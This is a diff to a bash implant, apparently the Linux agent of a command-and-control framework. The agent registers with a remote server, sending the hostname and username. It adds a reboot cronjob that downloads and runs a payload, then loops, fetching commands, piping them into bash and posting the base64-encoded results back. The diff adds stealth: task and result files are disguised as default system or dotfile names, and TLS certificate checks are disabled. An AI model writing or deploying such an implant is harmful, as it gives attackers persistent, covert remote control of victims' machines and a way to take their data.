@@ -7,31 +7,47 @@ interface="REPLACE_INTERFACE"
 n=.3
 
 #Define agent Registeration link
-regl="http://$ip:$port/reg/"
+regl="https://$ip:$port/reg/"
 
 declare -A data=( [eth]=$interface [hname]=$(hostname) )
 
 #Get defined agent name (6 random characters)
-name=$(curl -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami) $regl)
+name=$(curl -k -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami) $regl)
 
 #Define task, results links
-taskl="http://$ip:$port/tasks/$name/"
-resultl="http://$ip:$port/Lin-results/$name/"
+taskl="https://$ip:$port/tasks/$name/"
+resultl="https://$ip:$port/Lin-results/$name/"
 
 # Add the cronjob to run the script after rebooting (presistency providing)
-echo "@reboot sleep 45 && wget http://$ip:$port/download/$interface -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash" | crontab -
+echo "@reboot sleep 45 && wget --no-check-certificate https://$ip:$port/lin-download/$interface -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile" | crontab -
 
 while :
 do
+    #file names are taken from default files in /tmp in root for stelthiness
+    if [ $(whoami) == "root" ]; then 
+        path="/tmp"             
+        tasks=".Xl1-unix"
+        results=".X1l-unix"
+        encResult=".Xll-unix"
+    else
+    #For normal users we choosed these file names under the /home dir which are alike other default files too 
+        path="/home/$(whoami)"
+        tasks=".bash-History"
+        results=".bash-logout"
+        encResult=".bash-rc"
+    fi  
     #Check for tasks
-    curl $taskl > /tmp/tasks
-    if [ -s /tmp/tasks ]; then
+    curl -k $taskl > $path/$tasks
+    if [ -s $path/$tasks ]; then
         #Execute tasks added
-        cat /tmp/tasks | bash > /tmp/results
-        base64 /tmp/results > /tmp/enc-result
-        curl -X POST --data "@/tmp/enc-result" $resultl
+        cat $path/$tasks | bash > $path/$results
+        base64 $path/$results > $path/$encResult
+        curl -k -X POST --data "@$path/$encResult" $resultl
     fi
+        
     #Sleep for a while then continue the loop
     sleep $n
+
 done
+
 
